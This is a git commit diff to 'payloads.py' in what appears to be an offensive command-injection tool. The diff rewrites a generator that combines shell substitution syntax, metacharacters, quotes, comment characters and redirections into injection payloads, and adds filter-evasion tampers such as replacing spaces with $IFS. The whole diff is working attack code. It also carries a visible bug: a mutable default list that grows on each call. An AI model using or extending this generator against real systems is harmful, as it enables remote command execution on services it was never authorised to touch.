d50794860654468aeb0c41596f0b11349699f569
toast <58362380+Traumatism@users.noreply.github.com>
2023-02-20 14:24:22 +0100

    Update

--- raycharles/payloads.py
+++ raycharles/payloads.py
@@ -12,33 +12,41 @@ SUBSTITUTION_PATTERNS = ("$(%(cmd)s)", "`%(cmd)s`")
 ENDINGS = (">/dev/null", "2>/dev/null")
 
 
-def build_payloads() -> Generator[PayloadGenerator, None, None]:
-    yield lambda cmd: cmd
+def build_payloads(
+    tampers=[
+        add_dollar_and_ats,
+        replace_spaces_with_ifs,
+    ]
+) -> Generator[PayloadGenerator, None, None]:
+    tampers.append(lambda x: x)
 
-    for sp in SUBSTITUTION_PATTERNS:
-        yield lambda cmd: sp % {"cmd": cmd}
+    for tamper in tampers:
+        yield lambda cmd: tamper(cmd)
 
-    for mc in META_CHARS:
-        yield lambda cmd: mc + cmd
+        for sp in SUBSTITUTION_PATTERNS:
+            yield lambda cmd: tamper(sp % {"cmd": cmd})
 
-        for cc in COMMENT_CHARS:
-            yield lambda cmd: mc + cmd + cc
-
-        for end in ENDINGS:
-            yield lambda cmd: end + mc + cmd
-
-            for cc in COMMENT_CHARS:
-                yield lambda cmd: end + mc + cmd + cc
-
-    for qc in QUOTE_CHARS:
         for mc in META_CHARS:
-            yield lambda cmd: qc + mc + cmd
+            yield lambda cmd: tamper(mc + cmd)
 
             for cc in COMMENT_CHARS:
-                yield lambda cmd: qc + mc + cmd + cc
+                yield lambda cmd: tamper(mc + cmd + cc)
 
             for end in ENDINGS:
-                yield lambda cmd: qc + end + mc + cmd
+                yield lambda cmd: tamper(end + mc + cmd)
 
                 for cc in COMMENT_CHARS:
-                    yield lambda cmd: qc + end + mc + cmd + cc
+                    yield lambda cmd: tamper(end + mc + cmd + cc)
+
+        for qc in QUOTE_CHARS:
+            for mc in META_CHARS:
+                yield lambda cmd: tamper(qc + mc + cmd)
+
+                for cc in COMMENT_CHARS:
+                    yield lambda cmd: tamper(qc + mc + cmd + cc)
+
+                for end in ENDINGS:
+                    yield lambda cmd: tamper(qc + end + mc + cmd)
+
+                    for cc in COMMENT_CHARS:
+                        yield lambda cmd: tamper(qc + end + mc + cmd + cc)
